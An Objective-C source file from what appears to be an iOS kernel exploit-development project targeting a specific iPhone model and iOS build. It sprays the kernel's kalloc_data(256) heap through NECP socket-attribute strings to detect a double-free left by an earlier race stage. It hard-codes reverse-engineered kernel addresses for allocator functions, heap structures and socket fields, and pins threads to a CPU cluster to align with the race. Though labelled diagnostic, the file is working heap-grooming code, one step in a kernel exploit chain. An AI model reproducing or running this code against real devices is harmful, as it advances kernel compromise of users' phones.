//
//  P025NecpStringSpray.m
//  P007OpenOnly
//
//  NECP string double-free detection — data.kalloc(256) spray
//  Target: iPhone13,2 A14 iOS 26.5 / 23F77
//
//  Run AFTER p024 teardown race. If p024 left a freelist duplicate,
//  spraying unique strings may panic / errno / collide.
//
//  23F77 RE (necp_set_socket_attribute 0xa0d11ec):
//    alloc: size=strlen+1, heap=KHEAP_DATA 0x7b6e890, kalloc_data 0x9e18728
//    free:  same heap → kfree_data 0x9e1900c
//    STR_LEN 255 → kernel size 256 → kalloc_data(256) bucket
//    Slot: inpcb+0x178 (AF_INET). NOT GMD / iokit.IOGeneralMemoryDescriptor.
//    Magazine capacity 8 = shared zone magazine global (0x7ad20b8), not GMD-only.
//
//  NOT KRW. Diagnostic only.
//

#import "P025NecpStringSpray.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <mach/mach.h>
#import <mach/thread_policy.h>
#import <pthread.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <errno.h>
#import <stdio.h>

#define P025_LEVEL       A14_23F77_SOL_SOCKET
#define P025_OPTNAME     A14_23F77_SO_NECP_ATTRIBUTES
#define P025_TLV_TYPE    A14_23F77_NECP_TLV_TYPE
#define P025_STR_LEN     A14_23F77_NECP_STR_LEN
#define P025_BUF_LEN     (2 + P025_STR_LEN)   /* userspace TLV; kernel asks strlen+1 */
#define P025_KALLOC_SZ   (P025_STR_LEN + 1)   /* 256 → data.kalloc(256) */

#define P025_AF          AF_INET
#define P025_SOCK_TYPE   SOCK_DGRAM

#define P025_SPRAY_COUNT     64
#define P025_RESET_CYCLES   100
#define P025_CYCLE_DELAY_MS  10
/* Match p024 v7 affinity_tag so spray prefers same cluster as race frees. */
#define P025_AFFINITY_TAG     1

static FILE *p025_fp = NULL;

static void p025_pin_same_cluster(void) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    thread_affinity_policy_data_t pol;
    pol.affinity_tag = P025_AFFINITY_TAG;
    (void)thread_policy_set(pthread_mach_thread_np(pthread_self()),
                            THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&pol,
                            THREAD_AFFINITY_POLICY_COUNT);
}

static void p025_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p025_log(NSString *fmt, ...) {
    if (!p025_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:
                          @"p025_necp_string_spray_log.txt"];
        /* Truncate each run so the UI / recovery show only this session. */
        p025_fp = fopen(path.UTF8String, "w");
        if (p025_fp) {
            setvbuf(p025_fp, NULL, _IOLBF, 0);
            fprintf(p025_fp, "=== p025 session %s ===\n",
                    LabLocalMilitaryNow().UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p025_fp) {
        fprintf(p025_fp, "%s\n", msg.UTF8String);
        fflush(p025_fp);
    }
    NSLog(@"p025 %@", msg);
}

static void p025_build_tlv_unique(char *buf, int sock_idx,
                                  uint32_t seq, char fill) {
    buf[0] = (char)P025_TLV_TYPE;
    buf[1] = (char)P025_STR_LEN;
    uint16_t magic = 0xBEEF;
    memcpy(buf + 2, &magic, 2);
    memcpy(buf + 4, &sock_idx, 2);
    memcpy(buf + 6, &seq, 4);
    memset(buf + 10, fill, P025_STR_LEN - 8);
}

static int p025_initial_spray(int *fds, char fill_base) {
    p025_log(@"[spray] Phase 1: %d sockets × kalloc_data(%d)",
             P025_SPRAY_COUNT, P025_KALLOC_SZ);

    int ok = 0, err = 0;
    for (int i = 0; i < P025_SPRAY_COUNT; i++) {
        fds[i] = socket(P025_AF, P025_SOCK_TYPE, 0);
        if (fds[i] < 0) {
            p025_log(@"[spray] socket[%d] FAILED errno=%d", i, errno);
            return -1;
        }
        char buf[P025_BUF_LEN];
        p025_build_tlv_unique(buf, i, 0, fill_base + i);
        errno = 0;
        int kr = setsockopt(fds[i], P025_LEVEL, P025_OPTNAME,
                            buf, (socklen_t)P025_BUF_LEN);
        if (kr == 0) ok++;
        else {
            err++;
            p025_log(@"[spray] socket[%d] setsockopt FAILED errno=%d", i, errno);
        }
    }
    p025_log(@"[spray] Phase 1 DONE: ok=%d err=%d", ok, err);
    if (err > 0)
        p025_log(@"[spray] WARNING: %d sockets failed", err);
    return 0;
}

static void p025_reset_cycles(int *fds, char fill_base) {
    p025_log(@"[spray] Phase 2: %d reset cycles × %d sockets (free+realloc same bucket)",
             P025_RESET_CYCLES, P025_SPRAY_COUNT);
    p025_log(@"[spray] If freelist has duplicate (from p024):");
    p025_log(@"[spray]   PANIC = freelist traversal hit duplicate");
    p025_log(@"[spray]   unexpected errno = partial corruption");
    p025_log(@"[spray]   all succeed = freelist clean or self-healed");

    int total_ok = 0, total_err = 0, unexpected_errno = 0;
    for (int cycle = 0; cycle < P025_RESET_CYCLES; cycle++) {
        int cycle_ok = 0, cycle_err = 0;
        for (int i = 0; i < P025_SPRAY_COUNT; i++) {
            if (fds[i] < 0) continue;
            char buf[P025_BUF_LEN];
            uint32_t seq = (uint32_t)(cycle * P025_SPRAY_COUNT + i + 1);
            p025_build_tlv_unique(buf, i, seq, fill_base + i);
            errno = 0;
            int kr = setsockopt(fds[i], P025_LEVEL, P025_OPTNAME,
                                buf, (socklen_t)P025_BUF_LEN);
            if (kr == 0) {
                cycle_ok++;
                total_ok++;
            } else {
                cycle_err++;
                total_err++;
                if (errno != 0 && errno != 22 && errno != 42) {
                    unexpected_errno++;
                    p025_log(@"[spray] UNEXPECTED errno=%d cycle=%d sock=%d",
                             errno, cycle, i);
                }
            }
        }
        if ((cycle + 1) % 10 == 0) {
            p025_log(@"[spray] cycle %d/%d: ok=%d err=%d (total ok=%d err=%d)",
                     cycle + 1, P025_RESET_CYCLES,
                     cycle_ok, cycle_err, total_ok, total_err);
        }
        usleep(P025_CYCLE_DELAY_MS * 1000);
    }
    p025_log(@"[spray] Phase 2 DONE: total_ok=%d total_err=%d unexpected=%d",
             total_ok, total_err, unexpected_errno);
    if (unexpected_errno > 0)
        p025_log(@"[spray] *** ANOMALY: %d unexpected errno ***", unexpected_errno);
    if (total_err == 0 && unexpected_errno == 0)
        p025_log(@"[spray] All succeeded — freelist appears clean");
}

static void p025_collision_check(int *fds) {
    p025_log(@"[spray] Phase 3: Cross-socket collision check");
    if (fds[0] < 0 || fds[1] < 0) {
        p025_log(@"[spray] Need 2 valid sockets, skipping");
        return;
    }

    char buf0[P025_BUF_LEN], buf1[P025_BUF_LEN];
    p025_build_tlv_unique(buf0, 0, 0xDEAD, 'P');
    p025_build_tlv_unique(buf1, 1, 0xBEEF, 'Q');
    errno = 0;
    int kr0 = setsockopt(fds[0], P025_LEVEL, P025_OPTNAME, buf0, (socklen_t)P025_BUF_LEN);
    p025_log(@"[spray] socket[0] setsockopt(P) kr=%d errno=%d", kr0, errno);
    errno = 0;
    int kr1 = setsockopt(fds[1], P025_LEVEL, P025_OPTNAME, buf1, (socklen_t)P025_BUF_LEN);
    p025_log(@"[spray] socket[1] setsockopt(Q) kr=%d errno=%d", kr1, errno);

    p025_build_tlv_unique(buf0, 0, 0xCAFE, 'R');
    errno = 0;
    kr0 = setsockopt(fds[0], P025_LEVEL, P025_OPTNAME, buf0, (socklen_t)P025_BUF_LEN);
    p025_log(@"[spray] socket[0] setsockopt(R) kr=%d errno=%d", kr0, errno);
    p025_build_tlv_unique(buf1, 1, 0xF00D, 'S');
    errno = 0;
    kr1 = setsockopt(fds[1], P025_LEVEL, P025_OPTNAME, buf1, (socklen_t)P025_BUF_LEN);
    p025_log(@"[spray] socket[1] setsockopt(S) kr=%d errno=%d", kr1, errno);

    int ok = 0, err = 0;
    for (int i = 0; i < 100; i++) {
        char buf_a[P025_BUF_LEN], buf_b[P025_BUF_LEN];
        p025_build_tlv_unique(buf_a, 0, 0x1000 + (uint32_t)i, 'A');
        p025_build_tlv_unique(buf_b, 1, 0x2000 + (uint32_t)i, 'B');
        kr0 = setsockopt(fds[0], P025_LEVEL, P025_OPTNAME, buf_a, (socklen_t)P025_BUF_LEN);
        kr1 = setsockopt(fds[1], P025_LEVEL, P025_OPTNAME, buf_b, (socklen_t)P025_BUF_LEN);
        if (kr0 == 0 && kr1 == 0) ok++;
        else err++;
    }
    p025_log(@"[spray] Phase 3 DONE: alternation ok=%d err=%d", ok, err);
    if (err > 0)
        p025_log(@"[spray] *** COLLISION: %d/100 alternations failed ***", err);
    else
        p025_log(@"[spray] No collision detected");
}

@implementation P025NecpStringSpray

+ (void)tap {
    if (p025_fp) { fclose(p025_fp); p025_fp = NULL; }
    p025_pin_same_cluster();
    p025_log(@"========================================");
    p025_log(@"p025: NECP string double-free detection spray");
    p025_log(@"target: iPhone13,2 A14 26.5/23F77");
    p025_log(@"purpose: detect silent double-free from p024");
    p025_log(@"cluster: affinity_tag=%d + USER_INITIATED (match p024 v7)",
             P025_AFFINITY_TAG);
    p025_log(@"ABI: SOL_SOCKET=0x%x SO_NECP_ATTRIBUTES=0x%x TLV=0x%x len=%d",
             P025_LEVEL, P025_OPTNAME, P025_TLV_TYPE, P025_STR_LEN);
    p025_log(@"bucket: kalloc_data(%d) via KHEAP_DATA (NOT GMD 0xb0)",
             P025_KALLOC_SZ);
    p025_log(@"RE: setattr=0x%llx KHEAP_DATA=0x%llx kalloc=0x%llx kfree=0x%llx",
             (unsigned long long)A14_23F77_NECP_SETATTR,
             (unsigned long long)A14_23F77_KHEAP_DATA,
             (unsigned long long)A14_23F77_KALLOC_DATA,
             (unsigned long long)A14_23F77_KFREE_DATA);
    p025_log(@"slot: inpcb+0x%x (AF_INET)", A14_23F77_INPCB_NECP_STR0);
    p025_log(@"magazine: cap=%d (VA 0x%llx) insert=0x%llx — SAME as GMD path",
             A14_23F77_ZONE_MAGAZINE_CAP,
             (unsigned long long)A14_23F77_ZONE_MAGAZINE_CAP_VA,
             (unsigned long long)A14_23F77_ZONE_MAGAZINE_INSERT);
    p025_log(@"depot: both halves full then +1 free (~%d alloc + %d free same CPU)",
             A14_23F77_ZONE_MAGAZINE_CAP, A14_23F77_ZONE_MAGAZINE_CAP + 1);
    p025_log(@"spray_count=%d (>> mag) so frees can leave magazine into depot",
             P025_SPRAY_COUNT);
    p025_log(@"NOT KRW. Diagnostic only.");
    p025_log(@"========================================");

    int fds[P025_SPRAY_COUNT];
    memset(fds, -1, sizeof(fds));

    if (p025_initial_spray(fds, 'A') != 0) {
        p025_log(@"=== verdict: INITIAL SPRAY FAILED ===");
        p025_log(@"NOT KRW. Diagnostic only.");
        return;
    }

    p025_reset_cycles(fds, 'B');
    p025_collision_check(fds);

    int closed = 0;
    for (int i = 0; i < P025_SPRAY_COUNT; i++) {
        if (fds[i] >= 0) {
            close(fds[i]);
            closed++;
        }
    }
    p025_log(@"[cleanup] closed %d sockets", closed);

    p025_log(@"=== verdict: see log for detection signals ===");
    p025_log(@"note: PANIC = double-free confirmed (freelist corrupt)");
    p025_log(@"note: unexpected errno = possible freelist corruption");
    p025_log(@"note: all succeed = freelist clean or self-healed");
    p025_log(@"NOT KRW. Diagnostic only.");
}

@end
